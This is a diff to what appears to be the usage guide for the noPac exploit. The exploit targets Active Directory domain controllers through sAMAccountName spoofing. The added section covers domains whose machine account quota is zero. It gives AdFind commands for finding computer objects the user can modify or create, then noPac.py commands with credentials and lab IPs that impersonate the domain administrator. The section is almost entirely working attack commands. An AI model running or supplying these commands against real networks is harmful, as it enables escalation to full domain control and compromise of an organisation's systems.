@@ -88,3 +88,33 @@ python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host la
 python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
 ```
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132151180.png)
+
+
+## MAQ = 0
+### Method 1
+Find the computer that can be modified by the current user.
+```
+AdFind.exe -sc getacls -sddlfilter ;;"[WRT PROP]";;computer;domain\user  -recmute
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171448715.png)
+
+Exp: add `-no-add` and target with `-new-name`.
+```
+python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -no-add -new-name nopactest$
+```
+
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171451347.png)
+
+### Method 2
+Find CreateChild account, and use the account to exploit.
+```
+AdFind.exe -sc getacls -sddlfilter ;;"[CR CHILD]";;computer; -recmute
+```
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171455040.png)
+
+Exp: add `-create-child`
+```
+python noPac.py cgdomain.com/venus:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -create-child
+```
+
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171456582.png)
